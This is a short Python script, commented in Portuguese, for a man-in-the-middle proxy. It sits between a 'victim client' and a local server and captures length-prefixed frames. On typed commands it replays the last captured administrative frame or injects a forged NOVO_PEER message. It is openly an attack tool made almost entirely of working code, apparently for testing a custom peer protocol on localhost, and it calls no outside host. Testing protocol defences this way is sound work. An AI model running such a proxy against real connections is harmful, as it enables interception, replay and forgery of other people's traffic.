import socket, struct, threading, os, sys

LISTEN_PORT = int(os.environ.get("LISTEN_PORT", 5001))
TARGET = ("127.0.0.1", int(os.environ.get("TARGET_PORT", 5000)))

MSG_NOVO_PEER = 1
capturados = []
lock_cliente = threading.Lock()

def ler_exato(sock, n):
    dados = b""
    while len(dados) < n:
        parte = sock.recv(n-len(dados))
        if not parte:
            return None
        dados += parte
    return dados

def cliente_para_servidor(cli, srv):
    try:
        while True:
            dados = cli.recv(4096)
            if not dados:
                break
            srv.sendall(dados)
    except OSError:
        pass

def servidor_para_cliente(srv, cli):
    contador = 0
    try:
        while True:
            prefixo = ler_exato(srv, 4)
            if prefixo is None:
                break
            tamanho = struct.unpack("!I", prefixo)[0]
            corpo = ler_exato(srv, tamanho)
            if corpo is None:
                break
            contador +=1
            if contador > 4:
                capturados.append(corpo)
            with lock_cliente:
                cli.sendall(prefixo + corpo)

    except OSError:
        pass


#injeta um frame malformado no calnal do cliente
def injetar(cli, corpo):
    with lock_cliente:
        cli.sendall(struct.pack("!I", len(corpo)) + corpo)


def main():
    escuta = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    escuta.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    escuta.bind(("127.0.0.1", LISTEN_PORT))
    escuta.listen(1)
    print(f"proxy em 127.0.0.1:{LISTEN_PORT} => {TARGET[0]}:{TARGET[1]}", flush=True)

    cli, _= escuta.accept()
    srv = socket.create_connection(TARGET)
    print("cliente vitima conectado ao proxy", flush=True)
    threading.Thread(target=cliente_para_servidor, args=(cli, srv), daemon=True).start()
    threading.Thread(target=servidor_para_cliente, args=(srv, cli), daemon=True).start()

    for linha in sys.stdin:
        comando =linha.strip()
        if comando == "repetir":        #ataque de repleay
            if not capturados:
                print("nada capturado ainda", flush=True)
                continue
            injetar(cli, capturados[-1])
            print("ultimo frame administrativo reenviado (replay)", flush=True)
        elif comando == "forjar":
            seq = len(capturados)
            falso  = os.urandom(16) + os.urandom(32) + os.urandom(16)
            corpo = bytes([MSG_NOVO_PEER]) + seq.to_bytes(8, "big") + falso + os.urandom(256)
            injetar(cli, corpo)            
            print("NOVO_PEER forjado injetado", flush=True)
        elif comando == "sair":
            break



main()